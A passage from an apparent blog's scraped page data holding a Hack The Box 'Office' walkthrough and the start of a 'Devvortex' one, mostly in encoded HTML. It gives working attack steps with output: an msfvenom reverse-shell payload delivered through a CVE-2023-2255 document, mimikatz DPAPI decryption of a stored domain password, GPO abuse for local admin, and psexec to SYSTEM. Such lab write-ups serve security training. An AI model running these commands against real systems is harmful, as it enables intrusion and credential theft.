class=\u0026#34;inpstyl\u0026#34;\u0026gt;sales\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;management\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;management\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt;\u0026lt;div style=\u0026#34;display:flex; flex-direction:column; align-items: center;justify-content: center;\u0026#34;\u0026gt; \u0026lt;h3 style=\u0026#34;padding-left:50px\u0026#34; \u0026gt;upload resume:\u0026lt;/h3\u0026gt; \u0026lt;input id=\u0026#34;\u0026#34; class=\u0026#34;inpstylef\u0026#34; type=\u0026#34;file\u0026#34; name=\u0026#34;assignment\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; style=\u0026#34;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt;upload resume\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; privilege escalation using runascs.exe i was able to get tstark\u0026rsquo;s shell and found the user flag.\nc:\\users\\tstark\\desktop\u0026gt;dir dir volume in drive c has no label. volume serial number is c626-9388 directory of c:\\users\\tstark\\desktop 04/29/2024 02:40 am \u0026lt;dir\u0026gt; . 01/18/2024 11:33 am \u0026lt;dir\u0026gt; .. 04/29/2024 02:40 am 7,168 a.exe 04/28/2024 09:59 pm 34 user.txt 2 file(s) 7,202 bytes 2 dir(s) 4,989,374,464 bytes free c:\\users\\tstark\\desktop\u0026gt; after a lot of enumeration i found some open ports on the box.\nc:\\users\\tstark\\downloads\u0026gt;netstat -ano | findstr \u0026#34;listening\u0026#34; netstat -ano | findstr \u0026#34;listening\u0026#34; tcp 0.0.0.0:80 0.0.0.0:0 listening 4612 tcp 0.0.0.0:88 0.0.0.0:0 listening 684 tcp 0.0.0.0:135 0.0.0.0:0 listening 920 tcp 0.0.0.0:389 0.0.0.0:0 listening 684 tcp 0.0.0.0:443 0.0.0.0:0 listening 4612 tcp 0.0.0.0:445 0.0.0.0:0 listening 4 tcp 0.0.0.0:464 0.0.0.0:0 listening 684 tcp 0.0.0.0:593 0.0.0.0:0 listening 920 tcp 0.0.0.0:636 0.0.0.0:0 listening 684 tcp 0.0.0.0:3268 0.0.0.0:0 listening 684 tcp 0.0.0.0:3269 0.0.0.0:0 listening 684 tcp 0.0.0.0:3306 0.0.0.0:0 listening 7116 tcp 0.0.0.0:3389 0.0.0.0:0 listening 352 tcp 0.0.0.0:5985 0.0.0.0:0 listening 4 tcp 0.0.0.0:8083 0.0.0.0:0 listening 4612 tcp 0.0.0.0:9389 0.0.0.0:0 listening 2916 tcp 0.0.0.0:47001 0.0.0.0:0 listening 4 tcp 0.0.0.0:49664 0.0.0.0:0 listening 684 tcp 0.0.0.0:49665 0.0.0.0:0 listening 544 tcp 0.0.0.0:49666 0.0.0.0:0 listening 1172 tcp 0.0.0.0:49667 0.0.0.0:0 listening 1560 tcp 0.0.0.0:49668 0.0.0.0:0 listening 684 tcp 0.0.0.0:49670 0.0.0.0:0 listening 2260 tcp 0.0.0.0:55479 0.0.0.0:0 listening 684 tcp 0.0.0.0:55485 0.0.0.0:0 listening 684 tcp 0.0.0.0:55495 0.0.0.0:0 listening 664 tcp 0.0.0.0:60177 0.0.0.0:0 listening 7220 tcp 0.0.0.0:60180 0.0.0.0:0 listening 7244 tcp 10.10.11.3:53 0.0.0.0:0 listening 7220 tcp 10.10.11.3:139 0.0.0.0:0 listening 4 tcp 127.0.0.1:53 0.0.0.0:0 listening 7220 tcp [::]:80 [::]:0 listening 4612 tcp [::]:88 [::]:0 listening 684 tcp [::]:135 [::]:0 listening 920 tcp [::]:443 [::]:0 listening 4612 tcp [::]:445 [::]:0 listening 4 tcp [::]:464 [::]:0 listening 684 tcp [::]:593 [::]:0 listening 920 tcp [::]:3306 [::]:0 listening 7116 tcp [::]:3389 [::]:0 listening 352 tcp [::]:5985 [::]:0 listening 4 tcp [::]:8083 [::]:0 listening 4612 tcp [::]:9389 [::]:0 listening 2916 tcp [::]:47001 [::]:0 listening 4 tcp [::]:49664 [::]:0 listening 684 tcp [::]:49665 [::]:0 listening 544 tcp [::]:49666 [::]:0 listening 1172 tcp [::]:49667 [::]:0 listening 1560 tcp [::]:49668 [::]:0 listening 684 tcp [::]:49670 [::]:0 listening 2260 tcp [::]:55479 [::]:0 listening 684 tcp [::]:55485 [::]:0 listening 684 tcp [::]:55495 [::]:0 listening 664 tcp [::]:60177 [::]:0 listening 7220 tcp [::]:60180 [::]:0 listening 7244 tcp [::1]:53 [::]:0 listening 7220 port 8083 seemed to run a a internal http service i previously found.\nc:\\users\\tstark\\downloads\u0026gt;curl -x get 127.0.0.1:8083 curl -x get 127.0.0.1:8083 % total % received % xferd average speed time time time current dload upload total spent left speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- required meta tags --\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;!-- bootstrap css --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/squarely.css\u0026#34;\u0026gt; \u0026lt;!--common.css --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/common.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;holography industries\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--navbar --\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-dark bg-primary\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;business\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;navbar-toggler\u0026#34; type=\u0026#34;button\u0026#34; data-toggle=\u0026#34;collapse\u0026#34; data-target=\u0026#34;#navbarnav\u0026#34; aria-controls=\u0026#34;navbarnav\u0026#34; aria-expanded=\u0026#34;false\u0026#34; aria-label=\u0026#34;toggle navigation\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;navbar-toggler-icon\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarnav\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;navbar-nav ml-auto\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;nav-item active\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;home \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;(current)\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;resume.php\u0026#34;\u0026gt;submit application\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;services\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;about\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div class=\u0026#34;hero-header\u0026#34; style=\u0026#34;background-image: url(\u0026#39;img/business.jpg\u0026#39;)\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;holography industries\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;world leader in holographic technologies\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--main content--\u0026gt; \u0026lt;div class=\u0026#34;container mb-4 mt-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-8 mb-3\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;about us\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;p\u0026gt;we are all incredibly passionated about holograms at holography industries. we strongly believe that we are contributing to a brighter future for humanity.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;life\u0026#39;s all about evolution : and we are doing just that.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;make a phone call\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 align-items-center d-md-flex\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;img-fluid\u0026#34; src=\u0026#34;img/girl.jpg\u0026#34; alt=\u0026#34;lapi_girl\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--3 cards--\u0026gt; \u0026lt;div class=\u0026#34;container-fluid mb-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row bg-light p-md-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mb-3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;card-img-top\u0026#34; src=\u0026#34;img/1.jpg\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;know more about us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;our offices are currently all located in new york. if you would like to work with us, pay us a visit!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-footer\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mb-3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;card-img-top\u0026#34; src=\u0026#34;img/2.jpg\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;what we do?\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;just a bunch of passionate engineers trying to make the world a better place for everyone!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-footer\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mb-3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;card-img-top\u0026#34; src=\u0026#34;img/3.jpg\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;contact us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;you can either contact us by email or by phone. holographytech@holographytechnologies.htb | 514-000-000\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-footer\u0026#34;\u0026gt; 100 5113 100 5113 0 0 1492k 0 --:--:-- --:--:-- --:--:-- 1664k utton class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--footer--\u0026gt; \u0026lt;div class=\u0026#34;py-3 bg-light text-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;m-0\u0026#34;\u0026gt;copyright by \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;holographictech.htb\u0026lt;/a\u0026gt; 2030\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- optional javascript --\u0026gt; \u0026lt;!-- jquery first, then popper.js, then bootstrap js --\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.3.1.slim.min.js\u0026#34; integrity=\u0026#34;sha384-q8i/x+965dzo0rt7abk41jstqiaqvgrvzpbzo5smxkp4yfrvh+8abtte1pi6jizo\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\u0026#34; integrity=\u0026#34;sha384-uo2et0cphqdsjq6hjty5kvphtphzwj9wo1clhtmga3jdzwrnqq4sf86dihndz0w1\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-jjsmvgyd0p3pxb1rribzuayoiiy6orq6vrjieaff/njgzixfdsf4x0xim+b07jrm\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; let\u0026rsquo;s use chisel and forward the port and connect to it.\nattacker machine\nchisel server -p 4444 --reverse victim machine\nchisel client 10.10.16.59:4444 r:8083:127.0.0.1:8083 here\u0026rsquo;s the http service.\nand here\u0026rsquo;s the resume.php.\nprivilege escalation to ppots via cve-2023-2255\ncve-2023-2255 after doing a research i realized this exploit was exactly what i was looking for.\ni create a shell.exe file to get a reverse shell via msfvenom:\nmsfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=9001 -f exe -o shell.exe [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload no encoder specified, outputting raw payload payload size: 324 bytes final size of exe file: 73802 bytes saved as: shell.exe i create the exploit.odt file and transfer it to the following directory:\npython3 cve-2023-2255.py --cmd \u0026#39;c:\\programdata\\shell.exe\u0026#39; --output \u0026#39;exploit.odt\u0026#39; file exploit.odt has been created ! c:\\xampp\\htdocs\\internal\\applications\\exploit.odt after waiting few seconds i get reverse shell as ppotts user.\nrlwrap nc -lvnp 9001 listening on [any] 9001 ... connect to [10.10.15.29] from (unknown) [10.10.11.3] 53622 microsoft windows [version 10.0.20348.2322] (c) microsoft corporation. all rights reserved. c:\\program files\\libreoffice 5\\program\u0026gt;whoami whoami office\\ppotts shell as hhogan using mimikatz enumerate the credentials folders:\nps c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\u0026gt; get-childitem -hidden c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\ directory: c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials mode lastwritetime length name ---- ------------- ------ ---- -a-hs- 5/9/2023 2:08 pm 358 18a1927a997a794b65e9849883ac3f3e -a-hs- 5/9/2023 4:03 pm 398 84f1caeebf466550f4967858f9353fb4 -a-hs- 1/18/2024 11:53 am 374 e76cca3670cd9bb98df7 i use dpapi feature via mimikatz:\ndpapi (data protection api) is an api used for data protection and encryption operations in the microsoft windows operating system.\ndpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\xxxxxxxxxxx mimikatz # dpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\84f1caeebf466550f4967858f9353fb4 **blob** dwversion : 00000001 - 1 guidprovider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwmasterkeyversion : 00000001 - 1 guidmasterkey : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwflags : 20000000 - 536870912 (system ; ) dwdescriptionlen : 0000003a - 58 szdescription : enterprise credential data algcrypt : 00006603 - 26115 (calg_3des) dwalgcryptlen : 000000c0 - 192 dwsaltlen : 00000010 - 16 pbsalt : 649c4466d5d647dd2c595f4e43fb7e1d dwhmackeylen : 00000000 - 0 pbhmackkey : alghash : 00008004 - 32772 (calg_sha1) dwalghashlen : 000000a0 - 160 dwhmac2keylen : 00000010 - 16 pbhmack2key : 32e88dfd1927fdef0ede5abf2c024e3a dwdatalen : 000000c0 - 192 pbdata : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97 dwsignlen : 00000014 - 20 pbsign : 21bfb22ca38e0a802e38065458cecef00b450976 i know i might need the guidmasterkey so i\u0026rsquo;m keeping it temporarily.\nnow i\u0026rsquo;ll enumarate this directory and got a sid number:\nps c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\u0026gt; dir directory: c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect mode lastwritetime length name ---- ------------- ------ ---- d---s- 1/17/2024 3:43 pm s-1-5-21-1199398058-4196589450-691661856-1107 change sid and guidmasterkey to your own:\ndpapi::masterkey /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\\\\ /rpc mimikatz # dpapi::masterkey /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\\s-1-5-21-1199398058-4196589450-691661856-1107\\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc **masterkeys** dwversion : 00000002 - 2 szguid : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwflags : 00000000 - 0 dwmasterkeylen : 00000088 - 136 dwbackupkeylen : 00000068 - 104 dwcredhistlen : 00000000 - 0 dwdomainkeylen : 00000174 - 372 [masterkey] **masterkey** dwversion : 00000002 - 2 salt : c521daa0857ee4fa6e4246266081e94c rounds : 00004650 - 18000 alghash : 00008009 - 32777 (calg_hmac) algcrypt : 00006603 - 26115 (calg_3des) pbkey : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f [backupkey] **masterkey** dwversion : 00000002 - 2 salt : a2741b13d7261697be4241ebbe05098a rounds : 00004650 - 18000 alghash : 00008009 - 32777 (calg_hmac) algcrypt : 00006603 - 26115 (calg_3des) pbkey : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209 [domainkey] **domainkey** dwversion : 00000002 - 2 dwsecretlen : 00000100 - 256 dwaccesschecklen : 00000058 - 88 guidmasterkey : {e523832a-e126-4d6e-ac04-ed10da72b32f} pbsecret : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842 pbaccesscheck : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665 auto sid from path seems to be: s-1-5-21-1199398058-4196589450-691661856-1107 [backupkey] without dpapi_system: key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6 sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2 [domainkey] with rpc [dc] \u0026#39;office.htb\u0026#39; will be the domain [dc] \u0026#39;dc.office.htb\u0026#39; will be the dc server key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 sha1: 85285eb368befb1670633b05ce58ca4d75c73c77 after using the this command i see the password of hhogan\ndpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\xxxxxxxxxxxxx /guidmasterkey:: mimikatz # dpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\84f1caeebf466550f4967858f9353fb4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 **blob** dwversion : 00000001 - 1 guidprovider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwmasterkeyversion : 00000001 - 1 guidmasterkey : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwflags : 20000000 - 536870912 (system ; ) dwdescriptionlen : 0000003a - 58 szdescription : enterprise credential data algcrypt : 00006603 - 26115 (calg_3des) dwalgcryptlen : 000000c0 - 192 dwsaltlen : 00000010 - 16 pbsalt : 649c4466d5d647dd2c595f4e43fb7e1d dwhmackeylen : 00000000 - 0 pbhmackkey : alghash : 00008004 - 32772 (calg_sha1) dwalghashlen : 000000a0 - 160 dwhmac2keylen : 00000010 - 16 pbhmack2key : 32e88dfd1927fdef0ede5abf2c024e3a dwdatalen : 000000c0 - 192 pbdata : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97 dwsignlen : 00000014 - 20 pbsign : 21bfb22ca38e0a802e38065458cecef00b450976 decrypting credential: * volatile cache: guid:{191d3f9d-7959-4b4d-a520-a444853c47eb};keyhash:85285eb368befb1670633b05ce58ca4d75c73c77;key:available **credential** credflags : 00000030 - 48 credsize : 000000be - 190 credunk0 : 00000000 - 0 type : 00000002 - 2 - domain_password flags : 00000000 - 0 lastwritten : 5/9/2023 11:03:21 pm unkflagsorsize : 00000018 - 24 persist : 00000003 - 3 - enterprise attributecount : 00000000 - 0 unk0 : 00000000 - 0 unk1 : 00000000 - 0 targetname : domain:interactive=office\\hhogan unkdata : (null) comment : (null) targetalias : (null) username : office\\hhogan credentialblob : h4ppyftw183# attributes : evil-winrm -u \u0026#34;hhogan\u0026#34; -p \u0026#34;h4ppyftw183#\u0026#34; -i 10.10.11.3 evil-winrm shell v3.5 warning: remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine data: for more information, check evil-winrm github: https://github.com/hackplayers/evil-winrm#remote-path-completion info: establishing connection to remote endpoint *evil-winrm* ps c:\\users\\hhogan\\documents\u0026gt; shell as system i see that hhogan is in the gpo managers group and can write to the default domain group policy. this ability allows an attacker to perform a wide variety of attacks, they can execute commands via scheduled tasks, disable or modify system services, elevate privileges and more.\n*evil-winrm* ps c:\\users\\hhogan\\documents\u0026gt; whoami /groups group information ----------------- group name type sid attributes =========================================== ================ ============================================= ================================================== everyone well-known group s-1-1-0 mandatory group, enabled by default, enabled group builtin\\remote management users alias s-1-5-32-580 mandatory group, enabled by default, enabled group builtin\\users alias s-1-5-32-545 mandatory group, enabled by default, enabled group builtin\\pre-windows 2000 compatible access alias s-1-5-32-554 mandatory group, enabled by default, enabled group builtin\\certificate service dcom access alias s-1-5-32-574 mandatory group, enabled by default, enabled group nt authority\\network well-known group s-1-5-2 mandatory group, enabled by default, enabled group nt authority\\authenticated users well-known group s-1-5-11 mandatory group, enabled by default, enabled group nt authority\\this organization well-known group s-1-5-15 mandatory group, enabled by default, enabled group office\\gpo managers group s-1-5-21-1199398058-4196589450-691661856-1117 mandatory group, enabled by default, enabled group nt authority\\ntlm authentication well-known group s-1-5-64-10 mandatory group, enabled by default, enabled group mandatory label\\medium plus mandatory level label s-1-16-8448 *evil-winrm* ps c:\\users\\hhogan\\documents\u0026gt; get-gpo -all | select-object -expandproperty displayname windows firewall gpo default domain policy default active directory settings gpo default domain controllers policy windows update gpo windows update domain policy software installation gpo password policy now i add it to the computer as a local administrator via gpo.\n*evil-winrm* ps c:\\programdata\u0026gt; ./sharpgpoabuse.exe --addlocaladmin --useraccount hhogan --gponame \u0026#34;default domain policy\u0026#34; [+] domain = office.htb [+] domain controller = dc.office.htb [+] distinguished name = cn=policies,cn=system,dc=office,dc=htb [+] sid value of hhogan = s-1-5-21-1199398058-4196589450-691661856-1108 [+] guid of \u0026#34;default domain policy\u0026#34; is: {31b2f340-016d-11d2-945f-00c04fb984f9} [+] file exists: \\\\office.htb\\sysvol\\office.htb\\policies\\{31b2f340-016d-11d2-945f-00c04fb984f9}\\machine\\microsoft\\windows nt\\secedit\\gpttmpl.inf [+] the gpo does not specify any group memberships. [+] versionnumber attribute changed successfully [+] the version number in gpt.ini was increased successfully. [+] the gpo was modified to include a new local admin. wait for the gpo refresh cycle. [+] done! i update windows group policy settings:\n*evil-winrm* ps c:\\programdata\u0026gt; gpupdate /force updating policy... computer policy update has completed successfully. user policy update has completed successfully. i can easily see that hhogan are in the administrator group.\n*evil-winrm* ps c:\\programdata\u0026gt; net localgroup administrators alias name administrators comment administrators have complete and unrestricted access to the computer/domain members ------------------------------------------------------------------------------- administrator hhogan the command completed successfully. impacket-psexec.py hhogan:h4ppyftw183#@10.10.11.3 impacket v0.12.0.dev1+20230907.33311.3f645107 - copyright 2023 fortra [*] requesting shares on 10.10.11.3..... [*] found writable share admin$ [*] uploading file kbudclon.exe [*] opening svcmanager on 10.10.11.3..... [*] creating service nokz on 10.10.11.3..... [*] starting service nokz..... [!] press help for extra shell commands microsoft windows [version 10.0.20348.2322] (c) microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt; whoami nt authority\\system reference for root flag i followed namiq.net\u0026rsquo;s walkthrough.\n","title":"HTB Machine Office"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-machines/devvortex/","summary":"Devvortex - HTB Recon Nmap Services Port Service 80 http (nginx/1.18.0) 22 ssh () Subdomains (VHost) $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H \u0026quot;Host: FUZZ.devvortex.htb\u0026quot; -fs 154 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.","tags":["ctf","CVE-2023-23752","dev","htb","joomla","linux","vortex"],"text":"devvortex - htb recon nmap services port service 80 http (nginx/1.18.0) 22 ssh () subdomains (vhost) $ ffuf -w ~/seclists/discovery/web-content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -h \u0026quot;host: fuzz.devvortex.htb\u0026quot; -fs 154 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: method : get :: url : http://devvortex.htb :: wordlist : fuzz: /home/neptune/seclists/discovery/web-content/raft-medium-directories-lowercase.txt :: header : host: fuzz.devvortex.htb :: follow redirects : false :: calibration : false :: timeout : 10 :: threads : 40 :: matcher : response status: 200-299,301,302,307,401,403,405,500 :: filter : response size: 154 ________________________________________________ dev [status: 200, size: 23221, words: 5081, lines: 502, duration: 135ms] :: progress: [26584/26584] :: job [1/1] :: 336 req/sec :: duration: [0:00:56] :: errors: 1 :: 